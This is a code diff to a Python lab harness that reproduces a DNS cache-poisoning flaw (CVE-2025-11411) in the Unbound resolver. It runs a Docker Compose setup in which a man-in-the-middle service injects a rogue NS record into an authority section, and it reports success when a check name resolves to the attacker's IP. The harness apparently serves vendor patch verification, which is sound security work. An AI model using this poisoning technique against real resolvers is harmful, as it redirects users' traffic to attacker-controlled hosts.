@@ -24,6 +24,7 @@ from run_smoke import dig_query  # noqa: E402
 
 ATTACKER_CHECK_IP = "198.51.100.99"
 AUTH_CHECK_IP = "203.0.113.99"
+PARENT_NS_IP = "172.30.0.12"
 ATTACKER_NS_IP = "172.30.0.66"
 DEFAULT_IMAGE = "l33tlamer/unbound-recursive:1.24.0"
 COMPOSE_FILES = [
@@ -49,6 +50,16 @@ def compose(args: list[str], env: dict[str, str] | None = None) -> subprocess.Co
 
 def dig_unbound(name: str, qtype: str = "A") -> dict:
     return dig_query("127.0.0.1", 9053, name, qtype, timeout=5.0)
+
+
+def wait_mitm_ready(env: dict[str, str], timeout: float = 90.0) -> bool:
+    deadline = time.time() + timeout
+    while time.time() < deadline:
+        logs = compose(["logs", "--tail", "8", "mitm"], env=env)
+        if "mitm mode=authority-ns-glue" in (logs.stdout or ""):
+            return True
+        time.sleep(1)
+    return False
 
 
 def main() -> int:
@@ -78,30 +89,42 @@ def main() -> int:
         (out_dir / "compose-up.err").write_text(up.stderr or up.stdout or "", encoding="utf-8")
         return 1
 
-    deadline = time.time() + 120
-    last: dict = {}
-    while time.time() < deadline:
-        last = dig_unbound("agree.lab.stackdiff.")
-        if last.get("rcode") == "NOERROR" and last.get("answers"):
-            break
-        time.sleep(2)
-    else:
-        print(f"Unbound not ready: {last}", file=sys.stderr)
+    if not wait_mitm_ready(env):
+        print("MITM not ready", file=sys.stderr)
         (out_dir / "result.json").write_text(
-            json.dumps({"pass": False, "error": "not_ready", "last": last}, indent=2) + "\n",
+            json.dumps({"pass": False, "error": "mitm_not_ready"}, indent=2) + "\n",
             encoding="utf-8",
         )
         if not args.keep:
             compose(["down"], env=env)
         return 1
 
-    # Prime delegation via parent referral, then re-query under inject.
+    deadline = time.time() + 120
+    ready_obs: dict = {}
+    while time.time() < deadline:
+        ready_obs = dig_unbound("ns.stackdiff.", "A")
+        answers = ready_obs.get("answers") or []
+        if ready_obs.get("rcode") == "NOERROR" and PARENT_NS_IP in answers:
+            break
+        time.sleep(2)
+    else:
+        print(f"Unbound not ready: {ready_obs}", file=sys.stderr)
+        (out_dir / "result.json").write_text(
+            json.dumps({"pass": False, "error": "not_ready", "ready": ready_obs}, indent=2) + "\n",
+            encoding="utf-8",
+        )
+        if not args.keep:
+            compose(["down"], env=env)
+        return 1
+
+    referral = dig_unbound("lab.stackdiff.", "NS")
+    time.sleep(0.5)
     prime = dig_unbound(args.query)
     time.sleep(0.5)
     inject = dig_unbound(args.query)
     time.sleep(0.5)
     check = dig_unbound("check.lab.stackdiff.")
-    ns_probe = dig_unbound("ns.attacker.example.")
+    ns_probe = dig_unbound("ns.attacker.stackdiff.")
 
     check_answers = check.get("answers") or []
     accept = ATTACKER_CHECK_IP in check_answers
@@ -113,24 +136,36 @@ def main() -> int:
         "image": args.image,
         "topology": "stub stackdiff. → parent; lab.stackdiff NS via referral to MITM",
         "mitm_mode": "authority-ns-glue",
-        "vendor_vector": "pollute1-shaped zone-cut NS in AUTHORITY of positive A reply",
+        "vendor_vector": "pollute1: zone-cut NS→ns.attacker.stackdiff on positive A only",
         "vendor_source": "vendor/cve-2025-11411/patch_CVE-2025-11411_option_tests.diff",
         "query": args.query,
+        "ready_observation": ready_obs,
+        "referral_observation": referral,
         "prime": prime,
         "inject_observation": inject,
         "check_observation": check,
         "ns_attacker_probe": ns_probe,
-        "glue_cache_accept": accept,
+        "delegation_poisoned": accept,
         "check_still_auth": still_auth,
         "ns_attacker_resolved": glue_ns,
         "pass": accept,
         "notes": (
             "PASS = check.lab.stackdiff answered by attacker (198.51.100.99). "
-            "That is the vendor-equivalent accept signal on iterator path."
+            "Ready via parent stub; referral prime; inject on child A query."
         ),
     }
     (out_dir / "result.json").write_text(json.dumps(result, indent=2) + "\n", encoding="utf-8")
-    print(json.dumps({"glue_cache_accept": accept, "pass": accept, "artifact": str(out_dir)}, indent=2))
+    print(
+        json.dumps(
+            {
+                "pass": accept,
+                "delegation_poisoned": accept,
+                "check_still_auth": still_auth,
+                "artifact": str(out_dir),
+            },
+            indent=2,
+        )
+    )
 
     if not args.keep:
         compose(["down"], env=env)
